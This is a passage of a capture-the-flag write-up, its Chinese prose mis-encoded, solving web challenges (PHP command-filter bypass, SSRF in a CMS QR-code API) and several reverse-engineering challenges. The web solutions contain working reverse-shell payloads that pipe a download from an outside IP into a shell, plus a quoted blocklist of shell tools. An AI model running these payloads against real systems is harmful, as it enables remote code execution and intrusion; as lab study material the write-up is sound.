invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¿‡æ»¤ str_replace ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡str_replaceæ¥ç»•è¿‡è¿™ä¸€å¤§ä¸²è¿‡æ»¤</p>
<p>æ¯”å¦‚ <code>str_replace(z,count(),whozami);</code> å°±å¯ä»¥æ‹¿åˆ° whoami</p>
<p>å› ä¸ºé¢˜ç›®ä¸­æ˜¯systemï¼Œæ‰€ä»¥å†å¥—ä¸€å±‚<code>php -r</code>å‘½ä»¤æ¥åå¼¹shell</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">cmd=php -r <span class="hljs-title function_ invoke__">system</span>((<span class="hljs-title function_ invoke__">str_replace</span>(z,<span class="hljs-title function_ invoke__">count</span>(),bazse64_decozde))(Y3VybCA0Ny45OS43Ny41MnxiYXNo));<br></code></pre></td></tr></table></figure>

<p>åå¼¹shellåç›®å½•ä¸­æ²¡æœ‰flagï¼Œé€šè¿‡ ps -aux æŸ¥çœ‹å‘ç°è¿˜æœ‰mysqlæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root           1  0.0  0.0   2364   512 pts/0    Ss+  03:49   0:00 <span class="hljs-built_in">tail</span> -f /dev/null<br>root          27  0.0  3.8  76568 20092 ?        Ss   03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      30  0.0  1.7  76592  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      31  0.0  2.5  77160 13380 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      32  0.0  1.7  76640  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      33  0.0  2.5  76844 13196 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>www-data      34  0.0  2.4  76648 12804 ?        S    03:49   0:00 /usr/sbin/apache2 -k start<br>root         166  0.0  0.3   2420  1620 pts/0    S+   03:49   0:00 /bin/sh /usr/bin/mysqld_safe<br>mysql        279  0.0 15.9 1083992 83680 pts/0   Sl+  03:49   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock<br>root         280  0.0  0.2   5740  1056 pts/0    S+   03:49   0:00 logger -t mysqld -p daemon error<br>root         320  0.0  0.0      0     0 pts/0    Z+   03:49   0:00 [debian-start] &lt;defunct&gt;<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥ mysql -u root -proot è¿æ¥ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ç”¨é”™è¯¯è¯­å¥æ¥è§¦å‘æŠ¥é”™å›æ˜¾</p>
<p><img src="/img/wp/2024/Simple_php-2.png"></p>
<p><img src="/img/wp/2024/Simple_php-3.png"></p>
<p><img src="/img/wp/2024/Simple_php-4.png"></p>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p><img src="/img/wp/2024/easycms-1.png"></p>
<p>REMOTE_ADDRç»•ä¸è¿‡å»ï¼Œè‚¯å®šè¦æ‰“ssrf</p>
<p>åå°åœ°å€è¢«ä¿®æ”¹äº†ï¼Œå°è¯•çˆ†ç ´æ— æœ</p>
<p>åœ¨å®˜æ–¹æ‰‹å†Œä¸­æ‰¾å‰å°æœ‰è¿œç¨‹è¯·æ±‚çš„æ¥å£</p>
<p>æœ€ç»ˆæ‰¾åˆ°ä¸€ä¸ª<a href="https://www.xunruicms.com/doc/444.html">äºŒç»´ç å‡½æ•°</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=ä¸­é—´LOGO&amp;text=å†…å®¹&amp;size=å¤§å°å€¼&amp;level=å®¹é”™ç‡<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2024/easycms-2.png"></p>
<p>åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šèµ·ä¸€ä¸ªflaskï¼Œé‡å®šå‘åˆ° <a href="http://127.0.0.1/">http://127.0.0.1/</a> cmdå°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ï¼Œç”¨ctfshowçš„ä¸€é”®åå¼¹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p>ç„¶åå‘åŒ…</p>
<p><code>http://eci-2ze9sa3j2fhr9odtqwsd.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/</code></p>
<p><img src="/img/wp/2024/easycms-3.png"></p>
<h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>ç»§ç»­ç”¨ä¸Šä¸€é¢˜çš„payloadï¼Œç½‘é¡µè¿”å›<code>äºŒç»´ç ç”Ÿæˆå¤±è´¥</code></p>
<p>çŒœæµ‹å¯¹å‚æ•°è¿›è¡Œäº†æ ¡éªŒï¼Œä¿®æ”¹æˆæ‰‹å†Œä¸­å®Œæ•´çš„è¯·æ±‚<code>/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/&amp;text=1&amp;size=h&amp;level=1</code></p>
<p>è¿”å›<code>æ­¤å›¾ç‰‡ä¸æ˜¯ä¸€å¼ å¯ç”¨çš„å›¾ç‰‡</code>ï¼Œåº”è¯¥æ˜¯å¯¹ç½‘é¡µçš„è¿”å›å€¼è¿›è¡Œäº†æ£€æŸ¥</p>
<p>åœ¨å®˜ç½‘ä¸‹è½½ è¿…ç¿CMSå¼€å‘æ¡†æ¶ æŸ¥çœ‹æºä»£ç (ä¹‹å‰çœ‹çš„ä¸€ç›´æ˜¯githubä¸Šçš„é¡¹ç›®ï¼Œåæ¥å‘ç°ç«Ÿç„¶ä¸é¢˜ç›®ç”¨çš„ä¸ä¸€æ ·ã€‚ã€‚ã€‚)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># dayrui\Fcms\Control\Api\Api.php</span><br><span class="hljs-comment">//ç”ŸæˆäºŒç»´ç å›¾ç‰‡</span><br><span class="hljs-keyword">require_once</span> CMSPATH.<span class="hljs-string">&#x27;Library/Phpqrcode.php&#x27;</span>;<br><span class="hljs-variable">$file</span> = WRITEPATH.<span class="hljs-string">&#x27;file/qrcode-&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$value</span>.<span class="hljs-variable">$thumb</span>.<span class="hljs-variable">$matrixPointSize</span>.<span class="hljs-variable">$errorCorrectionLevel</span>).<span class="hljs-string">&#x27;-qrcodpng&#x27;</span>;<br><span class="hljs-keyword">if</span> (!IS_DEV &amp;&amp; <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-variable">$QR</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title class_">\QRcode</span>::<span class="hljs-title function_ invoke__">png</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$errorCorrectionLevel</span>, <span class="hljs-variable">$matrixPointSize</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;äºŒç»´ç ç”Ÿæˆå¤±è´¥&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$QR</span> = <span class="hljs-title function_ invoke__">imagecreatefromstring</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$thumb</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;https://&#x27;</span>) !== <span class="hljs-literal">false</span><br>            &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;/&#x27;</span>) !== <span class="hljs-literal">false</span><br>            &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$thumb</span>, <span class="hljs-string">&#x27;http://&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;å›¾ç‰‡åœ°å€ä¸è§„èŒƒ&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$thumb</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$img</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;æ­¤å›¾ç‰‡ä¸æ˜¯ä¸€å¼ å¯ç”¨çš„å›¾ç‰‡&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">dr_catcher_data</span>(<span class="hljs-variable">$thumb</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$code</span>) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;å›¾ç‰‡å‚æ•°ä¸è§„èŒƒ&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$logo</span> = <span class="hljs-title function_ invoke__">imagecreatefromstring</span>(<span class="hljs-variable">$code</span>);<br>        <span class="hljs-variable">$QR_width</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$QR</span>);<span class="hljs-comment">//äºŒç»´ç å›¾ç‰‡å®½åº¦</span><br>        <span class="hljs-variable">$logo_width</span> = <span class="hljs-title function_ invoke__">imagesx</span>(<span class="hljs-variable">$logo</span>);<span class="hljs-comment">//logoå›¾ç‰‡å®½åº¦</span><br>        <span class="hljs-variable">$logo_height</span> = <span class="hljs-title function_ invoke__">imagesy</span>(<span class="hljs-variable">$logo</span>);<span class="hljs-comment">//logoå›¾ç‰‡é«˜åº¦</span><br>        <span class="hljs-variable">$logo_qr_width</span> = <span class="hljs-variable">$QR_width</span> / <span class="hljs-number">4</span>;<br>        <span class="hljs-variable">$scale</span> = <span class="hljs-variable">$logo_width</span>/<span class="hljs-variable">$logo_qr_width</span>;<br>        <span class="hljs-variable">$logo_qr_height</span> = <span class="hljs-variable">$logo_height</span>/<span class="hljs-variable">$scale</span>;<br>        <span class="hljs-variable">$from_width</span> = (<span class="hljs-variable">$QR_width</span> - <span class="hljs-variable">$logo_qr_width</span>) / <span class="hljs-number">2</span>;<br>        <span class="hljs-comment">//é‡æ–°ç»„åˆå›¾ç‰‡å¹¶è°ƒæ•´å¤§å°</span><br>        <span class="hljs-title function_ invoke__">imagecopyresampled</span>(<span class="hljs-variable">$QR</span>, <span class="hljs-variable">$logo</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$from_width</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$from_width</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_qr_width</span>(<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_qr_height</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_width</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$logo_height</span>);<br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$QR</span>, <span class="hljs-variable">$file</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å› ä¸ºæœ‰getimagesizeï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸ªå›¾ç‰‡å¤´</p>
<p>ç„¶åé€šè¿‡ dr_catcher_data è°ƒç”¨curlè§¦å‘ssrf</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># dayrui\Fcms\Core\Helper.php</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * è°ƒç”¨è¿œç¨‹æ•°æ® curlè·å–</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $url</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $timeout è¶…æ—¶æ—¶é—´ï¼Œ0ä¸è¶…æ—¶</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $is_log 0è¡¨ç¤ºè¯·æ±‚å¤±è´¥ä¸è®°å½•åˆ°ç³»ç»Ÿæ—¥å¿—ä¸­</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>   $ct 0è¡¨ç¤ºä¸å°è¯•é‡è¯•ï¼Œ1è¡¨ç¤ºé‡è¯•ä¸€æ¬¡</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span>  è¯·æ±‚ç»“æœå€¼</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// curlæ¨¡å¼</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;curl_init&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$url</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>) == <span class="hljs-string">&quot;https://&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>); <span class="hljs-comment">// è·³è¿‡è¯ä¹¦æ£€æŸ¥</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">true</span>); <span class="hljs-comment">// ä»è¯ä¹¦ä¸­æ£€æŸ¥SSLåŠ å¯†ç®—æ³•æ˜¯å¦å­˜åœ¨</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ct</span>) &#123;<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)&#x27;</span> . <span class="hljs-string">&#x27;Gecko/20100101 Firefox/40.0&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;X-Requested-With: XMLHttpRequest&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer: &#x27;</span>.<span class="hljs-variable">$url</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3&#x27;</span>,<br>        ));<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_USERAGENT,<span class="hljs-string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13)Gecko/20080311 Firefox/2.0.0.13&#x27;</span>);<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ€»å…±ä¼šè¯·æ±‚ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡çš„æ—¶å€™è¿”å›çœŸå®å›¾ç‰‡å°±å¥½äº†ï¼Œç¬¬äºŒæ¬¡å†é‡å®šå‘åˆ°127.0.0.1</p>
<p><img src="/img/wp/2024/easycms_revenge-1.png"></p>
<p>æ ¹æ®æ¡ä»¶ä¿®æ”¹flaskä¸­çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br>counter = <span class="hljs-number">0</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> counter<br><br>    <span class="hljs-keyword">if</span> counter == <span class="hljs-number">0</span>:<br>        counter += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;img.png&#x27;</span>, mimetype=<span class="hljs-string">&#x27;image/png&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> counter == <span class="hljs-number">1</span>:<br>        counter = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p>åå¼¹shellåæ‰§è¡Œreadflag</p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>idaä¸Šæ‰£ä¸‹æ¥çš„armæ±‡ç¼–ä»£ç ï¼Œä¸¢ç»™gptç¿»è¯‘ä¸€ä¸‹å¾—åˆ°åŠ å¯†é€»è¾‘ï¼Œçˆ†ä¸€ä¸‹å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">lst = [<span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x21b7</span>, <span class="hljs-number">0x1e47</span>, <span class="hljs-number">0x2027</span>, <span class="hljs-number">0x26e7</span>,<br>       <span class="hljs-number">0x10d7</span>, <span class="hljs-number">0x1127</span>, <span class="hljs-number">0x2007</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x1e47</span>,<br>       <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x11f7</span>, <span class="hljs-number">0x2007</span>, <span class="hljs-number">0x1037</span>,<br>       <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x1f17</span>, <span class="hljs-number">0x10d7</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x1017</span>,<br>       <span class="hljs-number">0x1f67</span>, <span class="hljs-number">0x1017</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x11c7</span>, <span class="hljs-number">0x1017</span>,<br>       <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1f17</span>, <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x0f47</span>, <span class="hljs-number">0x1127</span>,<br>       <span class="hljs-number">0x1037</span>, <span class="hljs-number">0x1e47</span>, <span class="hljs-number">0x1037</span>, <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1107</span>,<br>       <span class="hljs-number">0x1fd7</span>, <span class="hljs-number">0x1107</span>, <span class="hljs-number">0x2787</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>):<br>        <span class="hljs-keyword">if</span> (((j * <span class="hljs-number">0x50</span>) + <span class="hljs-number">0x14</span>) ^ <span class="hljs-number">0x4D</span>) + <span class="hljs-number">0x1e</span> == lst[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span><br></code></pre></td></tr></table></figure>



<h2 id="androidso-re"><a href="#androidso-re" class="headerlink" title="androidso_re"></a>androidso_re</h2><p>æœ‰ä¸¤ä¸ªnativeå‡½æ•°ç”¨æ¥è·å–keyå’Œivï¼Œç›´æ¥frida hookä¸€ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> jni = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>  jni[<span class="hljs-string">&quot;getkey&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getkey is called`</span>);<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getkey&quot;</span>]();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getkey result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br><br>  jni[<span class="hljs-string">&quot;getiv&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getiv is called`</span>);<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;getiv&quot;</span>]();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`jni.getiv result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br>&#125;);<br><br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°key&#x3D;A8UdWaeq,iv&#x3D;Wf3DLupsï¼ŒåŠ å¯†æ–¹å¼ä¸ºDES-CBC</p>
<p><img src="/img/wp/2024/androidso_re-1.png"></p>
<p>å¨å­è§£ä¸€ä¸‹å°±å¥½äº†</p>
<p><img src="/img/wp/2024/androidso_re-2.png"></p>
<h2 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h2><p>è¾“å…¥éšæœºå­—ç¬¦è§‚å¯ŸåŠ å¯†åçš„æ•°æ®ï¼Œæ¯ä¸‰ä½åŠ å¯†å¾—åˆ°4ä½æ•°æ®ï¼ŒçŒœæ˜¯base64ï¼Œç›´æ¥çˆ†ç ´å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> whereThel1b<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> hexdigits<br><span class="hljs-keyword">import</span> itertools<br>hexdigits += <span class="hljs-string">&quot;lg&#123;&#125;-&quot;</span><br>combinations = [<span class="hljs-string">&#x27;&#x27;</span>.join(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(hexdigits, repeat=<span class="hljs-number">3</span>)]<br><br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br><br>flag = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&quot;flag&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">14</span>):<br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>        flag[i*<span class="hljs-number">3</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>] = combo.encode()<br>        ret = whereThel1b.trytry(flag)<br><br>        <span class="hljs-keyword">if</span> ret[i*<span class="hljs-number">4</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>] == encry[i*<span class="hljs-number">4</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">4</span>]:<br>            <span class="hljs-built_in">print</span>(flag.decode())<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;</span><br></code></pre></td></tr></table></figure>


<h2 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h2><p>ä¼ªéšæœºæ•°ï¼Œä»å½“å‰æ—¶é—´å¾€å‰çˆ†ç ´seedè§£å¯†å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;time.h&gt;</span><br><br><br>unsigned char key[<span class="hljs-number">38</span>] = &#123;<br>    <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x88</span>,<br>    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB7</span>, <span 